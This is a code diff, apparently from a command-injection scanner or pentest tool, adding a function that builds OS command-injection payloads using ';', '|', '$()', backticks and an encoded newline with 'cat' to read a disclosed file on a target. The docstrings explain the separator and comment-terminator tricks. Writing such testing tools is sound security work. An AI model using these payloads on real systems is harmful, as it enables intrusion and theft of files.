@@ -47,6 +47,29 @@ def output_payloads(value: str) -> list:
     ]
 
 
+def read_file_payloads(value: str, path: str) -> list:
+    """Payloads that READ a specific disclosed file through the injection point. Pure.
+
+    `output_payloads` proves execution; this is the ordinary step after — a target that discloses an
+    absolute path (in a hint, a stack trace, an error page) and also executes injected commands has
+    handed over both halves. The separator shapes mirror `output_payloads` so anything that works there
+    works here.
+
+    A trailing comment terminator is included because the injection point is usually mid-command and the
+    remainder would otherwise be a syntax error that discards the whole line — the injection succeeds and
+    returns nothing, which is indistinguishable from not being injectable."""
+    v, p = value or "", (path or "").strip()
+    if not p:
+        return []
+    return [
+        {"payload": "%s; cat %s #" % (v, p)},
+        {"payload": "%s | cat %s" % (v, p)},
+        {"payload": "%s$(cat %s)" % (v, p)},
+        {"payload": "%s`cat %s`" % (v, p)},
+        {"payload": "%s%%0acat %s" % (v, p)},
+    ]
+
+
 def analyze_output(baseline: str, probe: str) -> dict | None:
     """Hit only on evidence of execution (the computed product or id/passwd),
     never on the echoed payload — EXPECTED is absent from every payload above."""
